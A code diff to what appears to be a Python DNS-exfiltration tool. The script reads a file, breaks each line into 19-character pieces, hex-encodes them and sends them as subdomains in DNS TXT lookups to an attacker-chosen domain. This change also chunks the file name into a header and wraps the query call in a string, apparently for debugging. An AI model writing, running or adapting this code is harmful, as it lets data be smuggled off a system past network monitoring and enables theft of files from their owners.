@@ -27,21 +27,23 @@ def make_query(missing_piece):
 	encoded_string = binascii.hexlify(string.encode('utf-8'))
 	"""put together the dns query"""
 	tld = ("d.%s.%s.%s"%(encoded_string.decode('utf-8'),file_id,args.domain))
-	"""do it!"""
+	"""do it!
 	try:
 		dns.resolver.query(tld,'TXT')
 	except:
 		pass
+	"""
+	print(num)
 
-num = 1
 file_id =  random_string_digits()
+num = 1
 
-'''parse out a file name and shorten it to 19 chars'''
-header = args.file[-19:]
+'''parse out a file name and create a header for data transfer'''
+for header in break_line(args.file,19):
+	make_query(header)
+num += 1
 
 with open (args.file,"r") as work_file:
-	make_query(header)
-	num += 1
 	for line in work_file:
 		for piece in break_line(line.rstrip(),19):
 			make_query(piece)
